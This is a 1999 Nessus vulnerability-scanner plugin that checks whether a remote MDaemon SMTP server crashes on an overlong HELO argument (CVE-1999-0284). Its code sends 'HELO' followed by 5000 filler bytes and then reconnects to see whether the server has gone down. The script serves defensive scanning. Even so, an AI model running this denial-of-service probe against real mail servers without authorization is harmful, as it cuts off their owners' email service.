#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10136);
 script_bugtraq_id(8555, 8621, 8622);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-0284");
 name["english"] = "MDaemon crash";
 name["francais"] = "Plantage de MDaemon";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the 
remote SMTP server by sending a too long
argument to the HELO command. 

This problem allows an attacker to make your
SMTP server crash, thus preventing you
from sending or receiving e-mails, which
will affect your work.

Solution : contact your vendor for a fix.

Risk factor : High";


 desc["francais"] = "Il s'est avéré possible de faire
planter le serveur SMTP distant en envoyant
un argument trop long à la commande HELO.

Ce problème permet à des pirates de faire
planter votre serveur SMTP, vous empechant
ainsi d'envoyer et de recevoir des emails,
ce qui affectera votre travail.

Solution : contactez votre vendeur pour un patch.

Facteur de risque : Sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote MTA";
 summary["francais"] = "Fait planter le MTA distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = smtp_recv_banner(socket:soc);
  s = string("HELO ", crap(5000), "\r\n");
  send(socket:soc, data:s);
  close(soc);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
